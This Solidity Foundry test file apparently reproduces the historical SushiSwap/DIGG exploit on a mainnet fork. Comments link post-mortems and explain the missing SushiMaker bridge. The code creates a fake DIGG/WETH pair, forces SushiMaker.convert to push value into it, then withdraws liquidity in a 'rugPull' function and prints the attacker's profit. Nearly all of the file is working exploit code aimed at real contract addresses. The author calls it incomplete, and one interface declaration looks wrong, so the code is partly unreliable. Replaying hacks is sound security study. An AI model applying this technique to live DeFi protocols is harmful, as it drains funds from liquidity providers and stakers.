// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
// PoC is incomplete, not sure why but Hardhat and JS gave me a severe headache ¯\_(ツ)_/¯
/*
Attack tx: https://etherscan.io/tx/0x0af5a6d2d8b49f68dcfd4599a0e767450e76e08a5aeba9b3d534a604d308e60b

Post Mortems: 
https://cmichel.io/replaying-ethereum-hacks-sushiswap-badger-dao-digg/ (author)
https://slowmist.medium.com/slow-mist-sushiswap-was-attacked-for-the-second-time-a47f2d110a84
https://www.rekt.news/badgers-digg-sushi/

When new pairs were added in Sushiswaps’ Onsen, some non-ETH pairs were added, but no "bridge" was set up in the SushiMaker for DIGG/WBTC.

Code:
SushiMaker: https://github.com/sushiswap/sushiswap/blob/64b758156da6f9bde1d8619f142946b005c1ba4a/contracts/SushiMaker.sol#L192
convert burns LP tokens, gets two tokens back, converts one to the other, converts the other to SUSHI, sends SUSHI to SushiBar (XSushi stakers)
deployed: https://etherscan.io/address/0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50

fee is sent to SushiMaker by SushiSwapPair's burn (from Router::removeLiquidity) in _mintFee
IUniswapV2Factory(factory).feeTo() == SushiMaker, check here: https://etherscan.io/address/0xc0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac#readContract*/

contract Exploit is Test {
    IUniswapV2Router02 private constant sushiRouter = IUniswapV2Router02(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    IUniswapV2Factory private constant sushiFactory = IUniswapV2Factory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant wethBridgeToken = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599); // WBTC
    IERC20 private constant nonWethBridgeToken = IERC20(0x798D1bE841a82a273720CE31c822C61a67a601C3); // DIGG
    ISushiMaker private constant sushiMaker = ISushiMaker(0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50);

    IUniswapV2Pair private wethPair; // Fake Pair Digg<>WETH

    function testHack() external {
        vm.createSelectFork("https://rpc.builder0x69.io", 11_720_049);

        IUniswapV2Pair FakePair = createAndProvideLiquidity();
        wethPair = IUniswapV2Pair(address(FakePair));

        vm.prank(tx.origin);
        sushiMaker.convert(address(wethBridgeToken), address(nonWethBridgeToken));

        rugPull();

        console.log("Attacker's profit: %s WETH", WETH.balanceOf(address(this)) / 1e18);
    }

    function createAndProvideLiquidity() public payable returns (IUniswapV2Pair pair) {
        // first acquire both tokens for vulnerable pair
        // we assume one token of the pair has a WETH pair
        // deposit all ETH for WETH
        // trade WETH/2 -> wethBridgeToken -> nonWethBridgeToken
        WETH.deposit{value: 0.001 ether}();
        WETH.approve(address(sushiRouter), 0.001 ether);
        address[] memory path = new address[](3);
        path[0] = address(WETH);
        path[1] = address(wethBridgeToken);
        path[2] = address(nonWethBridgeToken);
        uint256[] memory swapAmounts =
            sushiRouter.swapExactTokensForTokens(0.001 ether / 2, 0, path, address(this), type(uint256).max);
        uint256 nonWethBridgeAmount = swapAmounts[2];

        // create DIGG<>WETH
        pair = IUniswapV2Pair(sushiFactory.createPair(address(nonWethBridgeToken), address(WETH)));

        // add liquidity
        nonWethBridgeToken.approve(address(sushiRouter), nonWethBridgeAmount);
        sushiRouter.addLiquidity(
            address(WETH),
            address(nonWethBridgeToken),
            0.001 ether / 2, // rest of WETH
            swapAmounts[2], // all tokens we received
            0,
            0,
            address(this),
            type(uint256).max
        );
    }

    function rugPull() public payable {
        // redeem LP tokens for underlying
        IERC20 otherToken = IERC20(wethPair.token0()); // DIGG
        if (address(otherToken) == address(WETH)) {
            otherToken = IERC20(wethPair.token1());
        }
        uint256 lpToWithdraw = wethPair.balanceOf(address(this));
        wethPair.approve(address(sushiRouter), lpToWithdraw);
        sushiRouter.removeLiquidity(
            address(WETH), address(otherToken), lpToWithdraw, 0, 0, address(this), type(uint256).max
        );

        // trade otherToken -> wethBridgeToken -> WETH
        uint256 otherTokenBalance = otherToken.balanceOf(address(this));
        otherToken.approve(address(sushiRouter), otherTokenBalance);
        address[] memory path = new address[](3);
        path[0] = address(otherToken);
        path[1] = address(wethBridgeToken);
        path[2] = address(WETH);

        sushiRouter.swapExactTokensForTokens(otherTokenBalance, 0, path, address(this), type(uint256).max);
    }

    receive() external payable {}
}

/* -------------------- Interface -------------------- */
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
}

interface IUniswapV2Pair {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;

    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface ISushiMaker {
    function convert(address x, address y) external view returns (uint256);
}
